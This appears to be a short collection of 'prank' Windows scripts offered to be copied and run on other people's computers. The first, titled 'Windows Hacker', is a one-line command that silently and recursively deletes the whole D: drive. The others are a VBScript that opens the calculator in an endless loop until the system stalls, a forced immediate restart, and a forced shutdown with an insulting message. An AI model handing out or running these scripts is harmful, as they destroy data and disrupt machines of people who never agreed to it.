

======================================================

Windows Hacker :-
rd/s/q D:\

======================================================

Infinite Calculator :-

msgbox "Press OK to open my calculator"
do
Set shell=CreateObject("wscript.shell")
Shell.Run("calc.exe")
loop


=====================================================

Unfortunate Restart
@echo off
shutdown -r -f -t 00

======================================================

April Fool
msg * I don't like you
shutdown -c "Error! You are too stupid!" -s
